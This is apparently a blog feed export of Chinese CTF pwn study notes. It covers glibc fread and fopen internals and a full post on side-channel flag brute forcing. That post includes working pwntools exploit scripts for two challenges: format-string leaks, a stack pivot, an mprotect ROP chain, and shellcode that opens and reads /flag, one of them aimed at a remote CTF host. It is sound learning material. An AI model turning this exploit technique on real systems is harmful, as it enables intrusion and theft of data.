<h3 id="执行系统调用read读入数据"><a href="#执行系统调用read读入数据" class="headerlink" title="执行系统调用read读入数据"></a>执行系统调用read读入数据</h3><p>第三部分的核心是__underflow函数。它先是经过一些检查后，去调用了vtable中的_IO_file_underflow函数。检查如下，调用vtable中的_IO_file_underflow函数是在__underflow函数将要返回之时执行的_IO_UNDERFLOW (fp)。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">-1</span>) != <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_get_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">	<span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (_IO_have_markers (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_end))</span><br><span class="line">	<span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp);</span><br><span class="line">  <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/08/11/7FsBWa1IfY56eiD.png" alt="image-20220810181956710"></p>
<p>因为宏定义<code># define _IO_new_file_underflow _IO_file_underflow</code>，所以_IO_file_underflow在源码中为_IO_new_file_underflow.</p>
<p>然后上来就是很多检查，不过根据程序当前的状态，直接跳过了前面的检查。先去执行了_IO_switch_to_get_mode 函数，该函数将fp-&gt;_IO_read_base进行了赋值，其他指针依然为0。</p>
<p>等到_IO_switch_to_get_mode函数执行结束，出来之后就是疯狂的对read和write字段进行赋值，这里都初始化为了_IO_buf_base，代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">  = fp-&gt;_IO_buf_base;</span><br></pre></td></tr></table></figure>

<p>此时的_IO_FILE结构体各个字段如下</p>
<img src="https://s2.loli.net/2022/08/11/7NyOSiozVua2W3l.png" alt="image-20220810183427096" style="zoom:50%;" />

<p>然后此时调用了虚表中的_IO_file_read函数(如下图)</p>
<p><img src="https://s2.loli.net/2022/08/11/2wpmz16rJixnuAE.png" alt="image-20220810183730754"></p>
<p>而后该函数进行了系统调用read，它的第二个参数也就是fp-&gt;_IO_buf_base的值，第三个参数就是fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base的值。此时也才终于将文件中的数据读入到了resever area中(我认为现在数据还并不是在输入缓冲区中，因为按照定义的话_IO_read_end  _IO_read_base之间的才属于输入缓冲区，而现在还没有挪动_IO_read_end指针，因此严谨一些的话，现在数据是属于resever area中的)</p>
<p><img src="https://s2.loli.net/2022/08/11/ukGAYwK3PVNv1ly.png" alt="image-20220810184138466"></p>
<p>而后_IO_SYSREAD函数返回，read系统调用读入的字节数返回给变量count。此时执行到fp-&gt;_IO_read_end +&#x3D; count才算是将_IO_read_end 的指针移动，现在可以说是刚刚写入的数据位于了输入缓冲区中。</p>
<p><img src="https://s2.loli.net/2022/08/11/JnxizwrePEjB9Ts.png" alt="image-20220810185946550"></p>
<p>由于第二部分和第三部分是位于while循环中的，因此第三部分执行后，再次来到了第二部分。这回fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr的值是存在的，所以这次就可以进入if去执行memcpy函数了(如下)</p>
<img src="https://s2.loli.net/2022/08/11/Z28dwmJCfMTI1LA.png" alt="image-20220810190631208" style="zoom:50%;" />



<p>兜兜转转了很久，一直都是围绕着数据从文件中写到输入缓冲区中的操作，终于到了memcpy函数，通过这个拷贝函数，我们就可以将输入缓冲区中的数据拷贝指定的字节数到指定的地址，最后将指针_IO_read_ptr进行更新(如下图)，同时将want置零。</p>
<img src="https://s2.loli.net/2022/08/11/wFEjuN5IMZfL3ns.png" alt="image-20220810191534235" style="zoom:50%;" />

<p>该fread函数的源码分析至此就结束了，看一下最后的_IO_FILE结构体</p>
<img src="https://s2.loli.net/2022/08/11/6PqiupBO3AMNLf4.png" alt="image-20220810200528302" style="zoom:50%;" />

<h2 id="总结fread函数调用流程："><a href="#总结fread函数调用流程：" class="headerlink" title="总结fread函数调用流程："></a>总结fread函数调用流程：</h2><p>先判断是否存在reserve area(没有的话就malloc申请出来)，再去判断输入缓冲区是否还有剩余区域，如果有的话就直接拷贝输入缓冲区剩余部分的数据，如果没有的话，执行系统调用read从文件中读取数据到输入缓冲区中，然后循环再次去执行memcpy函数拷贝输入缓冲区的数据。</p>
<p>因为是初学IO，因此有些地方可能会理解有误，如果存在问题欢迎师傅们斧正</p>
<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://www.anquanke.com/post/id/177958#h3-3">IO FILE之fread详解 - 安全客，安全资讯平台 (anquanke.com)</a></p>
<p> <a href="http://blog.leanote.com/post/mut3p1g/file-struct">(leanote.com)</a></p>
<p><a href="https://fish-o0o.github.io/2019/12/29/FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/#fread">FILE结构体及漏洞利用方法 | Hacked By Fish_o0O (fish-o0o.github.io)</a></p>
<p><a href="https://ray-cp.github.io/archivers/IO_FILE_fwrite_analysis">IO FILE之fwrite详解 « 平凡路上 (ray-cp.github.io)</a></p>
]]></content>
      <categories>
        <category>源码调试&amp;&amp;分析</category>
      </categories>
      <tags>
        <tag>源码调试&amp;&amp;分析</tag>
      </tags>
  </entry>
  <entry>
    <title>关于侧信道爆破的学习总结</title>
    <url>/posts/82a683c0.html</url>
    <content><![CDATA[<h2 id="什么是侧信道爆破？"><a href="#什么是侧信道爆破？" class="headerlink" title="什么是侧信道爆破？"></a>什么是侧信道爆破？</h2><p>侧信道攻击是一种非常有趣的攻击手法，在pwn中通常为侧信道爆破。我的理解是侧信道爆破是指在程序没有正常回显的情况下通过执行精心构造后的数据，获取一些程序的现象或反馈来确定最终正确的flag，这种反馈比如有程序回显的错误，或者死循环等等。</p>
<span id="more"></span>

<blockquote>
<p>使用前提：</p>
<p>1、侧信道爆破需要执行我们编写的shellcode(因为程序中必然无法找到全部对应的gadget)，因此能够写入和执行一定字节的shellcode是必要的</p>
<p>2、程序在禁用了execve系统调用后，同时关闭了标准输出流后，才有必要使用侧信道爆破。</p>
<p>3、同时<strong>标准错误不能被关闭</strong>(因为我们需要它来反馈信息)，还必须要保证read可以从指定文件中读取flag，open或者openat系统调用要保证至少有一个可用。</p>
<p>攻击效果：在程序禁用了部分系统调用并且关闭了正常回显后，通过程序反馈的信息对进行flag逐位爆破。</p>
</blockquote>
<h2 id="侧信道爆破的整体思路"><a href="#侧信道爆破的整体思路" class="headerlink" title="侧信道爆破的整体思路:"></a>侧信道爆破的整体思路:</h2><p>首先需要想办法在程序中写入一段shellcode并且能将其执行。然后我们先执行open系统调用(如果open被禁用的话可以使用openat系统调用)，将flag文件打开返回一个文件描述符，然后用read系统调用将文件中的内容读到一片可读写的内存上，然后布置一段与flag比较的shellcode，这段shellcode的编写思路如下。</p>
<p>首先核心是用cmp指令将读入内存中的flag取一位来与我们给出的一个字符做对比，如果发现flag取的这一位与我们给出的字符一样就跳回到cmp指令处，因为字符都没变化，cmp比较后还是同样的结果，再次跳转回cmp指令处，这样无限循环程序不会有任何的回显。如果cmp比较后发现flag取一位得到的字符与我们所给的字符不同，就不进行跳转继续往下执行，我们不在后面布置任何的指令，这样程序继续往后执行，最终必然会崩溃。而我们根据程序在一定时间内是否反馈了崩溃信息来判断我们的flag是否判断正确(用je或者jz指令来实现这个跳转)</p>
<p>上面这段与flag对比的shellcode如下：</p>
<p><strong>(这段shellcode第一行并不通用，我们需要自己根据题目的情况将flag字符串的首地址放入rax，后面的三行汇编指令才是通用的)</strong>  另外汇编指令本身中的{}自然是非法的，这里所出现的{}是配合python脚本中的format方法(这个{}则是在爆破中的变量，因此需要占位符)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax,rsi</span><br><span class="line">mov bl,byte ptr [rax+&#123;&#125;]</span><br><span class="line">cmp bl,&#123;&#125;</span><br><span class="line">je $-3</span><br></pre></td></tr></table></figure>

<p>第一行就是将flag字符串的首地址给rax(这一行并不通用，根据题目自行修改)。</p>
<p>第二行将flag中的某一位取出。{}是相对于flag首地址的偏移，用来确定到底是取哪一位。通俗来将第二行的{}决定了正在爆破的是flag的哪一位。</p>
<p>第三行则将我们给出的字符与flag中的某一位进行比较</p>
<p>第四行如果cmp比较时，二者不相同就不会跳转。如果相同的话就将跳到当前指令的地址-3的位置，而cmp那个指令的机器码就是三字节，因此-3又回到了cmp执行前。由于我们给出的字符没有变，所以将无限循环下去。</p>
<p>上述的内容为核心步骤，最后整体的话需要用两个循环嵌套一下，大循环为while 1**(也就是不断循环下去，这个循环每走完一次就说明flag已经爆破出了一位)<strong>，小循环为for循环遍历我们给出flag中可能出现的字符组成的字符串</strong>(这个循环走一次就说明对flag中的某一位进行了判断，如果判断正确的话(也就是陷入了死循环)就break跳出当前循环，否则继续遍历字符串)**</p>
<p>具体的话结合相关题目练习一下吧</p>
<h2 id="相关例题："><a href="#相关例题：" class="headerlink" title="相关例题："></a>相关例题：</h2><h3 id="xman-2019-nooocall"><a href="#xman-2019-nooocall" class="headerlink" title="xman_2019_nooocall"></a>xman_2019_nooocall</h3><h4 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h4><p><img src="/../img/image-20220803100743845.png" alt="image-20220803100743845"></p>
<p>发现保护全开，并且沙箱禁用了所有的系统调用。</p>
<h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p><img src="/../img/image-20220803100927931.png" alt="image-20220803100927931"></p>
<p>虽然系统调用都禁用了，但程序自己将flag读到了v5的位置，因此还是可以使用侧信道爆破的。可以发现程序自己读入了16个字节的shellcode，并将其执行。这就纯纯考的侧信道爆破了，下面就直接放脚本了，毕竟思路啥的上面已经说过了。</p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">s = <span class="string">&quot;&#123;&#125;-abcdefghijl01234567898&quot;</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="built_in">ord</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> s]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">add al, 2</span></span><br><span class="line"><span class="string">sal rax, 32</span></span><br><span class="line"><span class="string">mov bl, byte ptr [rax+&#123;&#125;]</span></span><br><span class="line"><span class="string">cmp bl, &#123;&#125;</span></span><br><span class="line"><span class="string">jz $-0x3 </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="comment"># debug(p,&#x27;pie&#x27;,0xD87)</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28383</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Your Shellcode &gt;&gt;&#x27;</span>, asm(shellcode.<span class="built_in">format</span>(index, <span class="built_in">list</span>[i])))</span><br><span class="line">        judge = p.recv(timeout=<span class="number">2</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> judge:</span><br><span class="line">            <span class="comment">#log_info(&#x27;success!&#x27;)</span></span><br><span class="line">            flag += <span class="built_in">chr</span>(<span class="built_in">list</span>[i])</span><br><span class="line">            log_info(flag)</span><br><span class="line">            index = index + <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> judge:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            <span class="comment">#log_info(&#x27;wrong!&#x27;)</span></span><br><span class="line">    <span class="comment">#log_info(flag)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>



<h3 id="ctfshow-卷王杯-checkin"><a href="#ctfshow-卷王杯-checkin" class="headerlink" title="ctfshow-卷王杯-checkin"></a>ctfshow-卷王杯-checkin</h3><h4 id="保护策略-1"><a href="#保护策略-1" class="headerlink" title="保护策略"></a>保护策略</h4><p><img src="/../img/image-20220803103106146.png" alt="image-20220803103106146"></p>
<p><img src="/../img/image-20220803103501444.png" alt="image-20220803103501444"></p>
<p>这题winmt师傅本意考的是侧信道爆破，但是忘记禁用execve系统调用了哈哈。这里我只记录侧信道爆破的方法。</p>
<h4 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p><img src="/../img/image-20220803103711730.png" alt="image-20220803103711730"></p>
<p>存在一个格式化字符串漏洞，很明显这里肯定是来泄露地址的，然后第二个read上存在溢出，但是溢出字节较少因此肯定要打一个栈迁移，然后我们用%p%25$p来泄露栈地址和libc地址。</p>
<h4 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h4><p>迁移到第二次read写入的数据上，先执行mprotect函数让此处的栈区变成可读可写可执行。因为这0x90的字节不够布置rop链的因此再用read系统调用来读入一次数据到栈上(这次数据的数量我们是可控的)。</p>
<p>接下来的第二次rop链，有两个问题，第一个是open系统调用被禁用了所以我们用openat来代替，第二个问题就是如果执行read系统调用那么它的文件描述符必须是0，因此采用的对抗策略是将标准输入用close关闭，然后再用openat打开flag文件，此时返回的文件描述符就是0了。然后就是read将flag读出来，然后用侧信道爆破的shellcode处理一下即可。</p>
<p>最后要注意的是openat这个系统调用，如果是绝对路径的话那么直接当成open用就行(不过还得给第一个参数和第三个参数，路径位于第二个参数的位置)，如果是相对路径的话，第二个参数的路径是相对于第一个参数文件描述符的位置来说的，如果想相对于当前工作目录的路径来说的话，需要第一个参数为-100(第三个参数也需要是正常的，具体的话查一下手册或者百度都行)</p>
<p><img src="/../img/image-20220803110340977.png" alt="image-20220803110340977"></p>
<p>但是不知道为啥，我只要用相对路径的话，openat系统调用也能顺利执行，但是莫名其妙就把我本地的flag文件给删了，我也是很懵，本地的话只能用绝对路径来搞。</p>
<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">s=<span class="string">&quot;-0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line"><span class="built_in">list</span>=[<span class="built_in">ord</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> s]</span><br><span class="line">index=<span class="number">0</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        p=process(<span class="string">&#x27;./checkin&#x27;</span>)</span><br><span class="line">        <span class="comment">#p=remote(&#x27;pwn.challenge.ctf.show&#x27;,28080)</span></span><br><span class="line">        leave_ret=<span class="number">0x401402</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Please leave your name :\n&#x27;</span>,<span class="string">&#x27;%p%25$p&#x27;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Hello, &#x27;</span>)</span><br><span class="line">        leak_stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">        leak_libc_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">        <span class="comment">#log_addr(&#x27;leak_libc_addr&#x27;)</span></span><br><span class="line">        <span class="comment">#log_addr(&#x27;leak_stack_addr&#x27;)</span></span><br><span class="line">        target_addr=leak_stack_addr+<span class="number">0x10</span></span><br><span class="line">        libc_base_addr=leak_libc_addr-<span class="number">0x271e3</span></span><br><span class="line">        <span class="comment">#log_addr(&#x27;libc_base_addr&#x27;)</span></span><br><span class="line">        <span class="comment">#debug(p,0x401403)</span></span><br><span class="line">        pop_rsi=libc_base_addr+<span class="number">0x2709c</span></span><br><span class="line">        pop_rdx_r12=libc_base_addr+<span class="number">0x11c421</span></span><br><span class="line">        pop_rdi=libc_base_addr+<span class="number">0x26bb2</span></span><br><span class="line">        syscall=libc_base_addr+<span class="number">0x2588d</span></span><br><span class="line">        pop_rax=libc_base_addr+<span class="number">0x28ff4</span></span><br><span class="line">        mprotect=libc_base_addr+<span class="number">0x11bbb0</span></span><br><span class="line">        bin_sh_addr=<span class="number">0x00000000001b6613</span>+libc_base_addr</span><br><span class="line">        rop=p64(pop_rdi)+p64(leak_stack_addr&amp;~<span class="number">0xfff</span>)+p64(pop_rsi)+p64(<span class="number">0x1000</span>)+p64(pop_rdx_r12)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)</span><br><span class="line">        rop+=p64(pop_rax)+p64(<span class="number">10</span>)+p64(mprotect)+p64(leak_stack_addr+<span class="number">0x68</span>)</span><br><span class="line">        rop+=<span class="string">b&quot;\x48\x89\xE6\x48\xC7\xC7\x00\x00\x00\x00\x48\xC7\xC2\x00\x02\x00\x00\x0F\x05&quot;</span></span><br><span class="line">        payload=rop.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(target_addr-<span class="number">8</span>)+p64(leave_ret)</span><br><span class="line">        p.sendafter(<span class="string">&#x27;Now, please tell us more about you to check in :\n&#x27;</span>,payload)</span><br><span class="line">        rop=<span class="string">b&quot;\x90&quot;</span>*<span class="number">23</span>+<span class="string">&quot;\x6A\x00\x5F\x6A\x03\x58\x0F\x05\x68\x01\x01\x00\x00\x58\x6A\x00\x5A\x6A\x9C\x5F\x48\xBE\x2F\x66\x6C\x61\x67\x00\x00\x00\x56\x54\x5E\x0F\x05\x68\x60\x40\x40\x00\x5E\x6A\x00\x5F\x6A\x30\x5A\x48\x31\xC0\x0F\x05&quot;</span></span><br><span class="line">        shellcode=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        mov rax,rsi</span></span><br><span class="line"><span class="string">        mov bl,byte ptr [rax+&#123;&#125;]</span></span><br><span class="line"><span class="string">        cmp bl,&#123;&#125;</span></span><br><span class="line"><span class="string">        je $-3</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        rop+=asm(shellcode.<span class="built_in">format</span>(index,<span class="built_in">list</span>[i]))</span><br><span class="line">        p.sendline(rop)</span><br><span class="line">        judge=p.can_recv(timeout=<span class="number">3</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> judge:</span><br><span class="line">            log_info(<span class="string">&#x27;success!&#x27;</span>)</span><br><span class="line">            flag += <span class="built_in">chr</span>(<span class="built_in">list</span>[i])</span><br><span class="line">            log_info(flag)</span><br><span class="line">            index = index + <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> judge:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            <span class="comment">#log_info(&#x27;wrong!&#x27;)</span></span><br><span class="line">            <span class="comment">#log_info(flag)</span></span><br><span class="line">        <span class="comment">#log(&#x27;i&#x27;,chr(list[i]))</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>我比较喜欢用自己汇编转的机器码，但是机器码的话，各位师傅肯定看的不方便，我这里给一下我rop链机器码对应的汇编指令。填充这么多nop指令是因为我构造的rop链中的read系统调用输入的数据需要nop指令占一下位，才能将有效指令写到执行流上。(可以调read的第二个参数，但我当时懒的弄了，这样省事)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov    rsi,rsp</span><br><span class="line">mov    rdi,0x0</span><br><span class="line">mov    rdx,0x200</span><br><span class="line">syscall</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">push 0</span><br><span class="line">pop rdi</span><br><span class="line">push 3</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line">push 257</span><br><span class="line">pop rax</span><br><span class="line">push 0</span><br><span class="line">pop rdx</span><br><span class="line">push -100</span><br><span class="line">pop rdi</span><br><span class="line">mov rsi, 0x67616c662f</span><br><span class="line">push rsi</span><br><span class="line">push rsp</span><br><span class="line">pop rsi</span><br><span class="line">syscall</span><br><span class="line">push 0x404060</span><br><span class="line">pop rsi</span><br><span class="line">push 0</span><br><span class="line">pop rdi</span><br><span class="line">push 0x30</span><br><span class="line">pop rdx</span><br><span class="line">xor rax,rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20220803111703647.png" alt="image-20220803111703647"></p>
<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://www.cnblogs.com/LynneHuan/p/15674233.html">roderick师傅的博客</a></p>
<p><a href="https://www.cnblogs.com/winmt/articles/15943249.html">winmt师傅的博客</a></p>
<p><a href="https://blog.csdn.net/The_perfect_world/article/details/89280224">https://blog.csdn.net/The_perfect_world/article/details/89280224</a></p>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>侧信道爆破</tag>
      </tags>
  </entry>
  <entry>
    <title>IO学习--源码调试fopen函数</title>
    <url>/posts/ce09b1a.html</url>
    <content><![CDATA[<h2 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h2><p>这篇文章是学习IO，进行源码分析四部曲中的第一篇，本篇主要就是<strong>源码调试fopen函数</strong>，并<strong>没有单独对fopen函数的源码专门阅读分析</strong>(之后的三篇基本上是源码分析)。如果要看fopen函数源码分析的话可以去看下文末的参考文章(师傅们写的都非常好诶)</p>
<p>这里我写了一篇关于初学者应该如何去读glibc源码的文章(希望可以帮助到刚刚入门的师傅们) <a href="https://www.cnblogs.com/ZIKH26/articles/16582817.html">here</a></p>
<span id="more"></span>

<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="IO-FILE-plus结构体"><a href="#IO-FILE-plus结构体" class="headerlink" title="_IO_FILE_plus结构体"></a>_IO_FILE_plus结构体</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>_IO_FILE_plus结构包含了_IO_FILE结构体和 _IO_jump_t 结构体。</p>
<h3 id="IO-FILE结构体"><a href="#IO-FILE结构体" class="headerlink" title="_IO_FILE结构体"></a>_IO_FILE结构体</h3><p>先说_IO_FILE结构体，该结构体就是标准IO库中用来描述文件的结构，在程序执行fopen函数时会创建该结构，并分配在堆中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span> </span><br><span class="line">  <span class="type">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h2 id="调试fopen函数"><a href="#调试fopen函数" class="headerlink" title="调试fopen函数"></a>调试fopen函数</h2><p>调试之前的话，可以先看一下整体调用的流程，这样在调试的时候有个参考。另外就是调试的时候，要附加一下源码，关于gdb源码调试环境搭建可以参考我的<a href="https://www.cnblogs.com/ZIKH26/articles/16150232.html">这篇文章</a>。</p>
<p>源代码</p>
